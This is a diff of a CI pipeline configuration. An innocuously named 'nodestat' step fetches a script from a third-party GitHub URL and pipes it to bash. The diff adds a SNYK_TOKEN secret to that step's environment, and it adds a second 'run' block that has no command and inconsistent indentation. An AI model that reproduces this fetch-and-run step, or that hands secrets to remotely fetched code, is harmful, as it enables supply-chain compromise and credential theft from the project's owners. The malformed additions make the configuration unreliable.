@@ -23,11 +23,16 @@ jobs:
       - run: apt update && apt upgrade -y && apt install nodejs npm curl sudo -y
       - run:
           name: "nodestat"
+          environment: 
+            SNYK_TOKEN: ${{ env.SNYK_TOKEN }}
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
   nodejsindex:
     executor: node/default 
     steps:
       - checkout
+      - run:
+        environment: 
+            SNYK_TOKEN: ${{ env.SNYK_TOKEN }}
       - run: cd www && npm install
       - run:
           command: cd www && npm run test
